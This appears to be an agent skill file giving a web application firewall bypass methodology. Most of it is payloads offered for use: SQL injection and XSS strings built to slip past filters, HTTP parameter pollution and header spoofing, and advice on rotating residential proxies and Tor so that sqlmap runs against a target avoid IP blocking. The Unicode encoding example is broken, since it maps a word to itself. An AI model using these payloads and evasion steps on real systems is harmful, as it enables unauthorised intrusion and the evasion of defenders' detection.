---
name: waf-bypass
description: Web Application Firewall bypass methodology applicable to all injection types. Covers encoding, obfuscation, chunked encoding, HTTP header manipulation, and protocol-level WAF bypass.
version: 1.0.0
license: Apache-2.0
---

# WAF Bypass Techniques

## Phase 1 — WAF Identification

```bash
wafw00f https://target.com
nmap --script http-waf-detect,http-waf-fingerprint target.com
```

Common WAFs: Cloudflare, AWS WAF, ModSecurity, Imperva, Akamai, Sucuri, F5 ASM.

## Encoding Bypasses

```
URL encoding:          SELECT → %53%45%4c%45%43%54
Double URL encoding:   SELECT → %2553%2545%254c%2545%2543%2554
Unicode encoding:      SELECT → SELECT
HTML entities:         < → &lt; or &#x3C;
Base64 (in JSON):      inject base64 and decode server-side
```

## SQL Injection WAF Bypass

```sql
-- Comment insertion
SE/**/LECT
UN/**/ION

-- Case variation
sElEcT uNiOn

-- Inline version comments (MySQL)
/*!UNION*/ /*!SELECT*/

-- Whitespace alternatives
%09 (tab), %0a (newline), %0d (carriage return), %0b, %0c

-- Keyword alternatives
AND → &&
OR → ||
= → LIKE, REGEXP, IN

-- Encoding + padding
1/**/UNION/**/SELECT/**/NULL,NULL,NULL--+
```

## XSS WAF Bypass

```html
<!-- Tag alternatives -->
<sVg OnLoAd=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Event handler alternatives when onclick blocked -->
onfocus autofocus
onanimationstart + CSS animation
onpointerdown

<!-- JavaScript alternatives when "javascript:" blocked -->
data:text/html,<script>alert(1)</script>
vbscript:alert(1)         (IE only)

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

## HTTP-Level Bypasses

```bash
# Chunked Transfer-Encoding (splits payload across chunks)
# Use Burp plugin "chunked-coding-converter"

# HTTP Parameter Pollution
?id=1&id=1 UNION SELECT 1,2,3--

# Large body padding (push payload past WAF inspection limit)
# Add thousands of harmless parameters before the payload

# Case-insensitive header manipulation
X-Forwarded-For: 127.0.0.1   (some WAFs trust XFF)
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

## IP Reputation Bypass

```bash
# Route through residential proxies / rotating exit nodes
proxychains4 sqlmap -u "http://target.com/?id=1" --dbs

# Use Tor exit nodes that aren't blacklisted
# Cloud provider IPs are often less suspicious than VPS/datacenter
```

## Tools

- [WAFW00F](https://github.com/EnableSecurity/wafw00f) — WAF fingerprinting
- [WAF Bypass Tool](https://github.com/nemesida-waf/waf-bypass) — automated bypass testing
- Burp Suite — chunked encoding plugin, manual bypass
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper) — `--tamper=space2comment,randomcase`
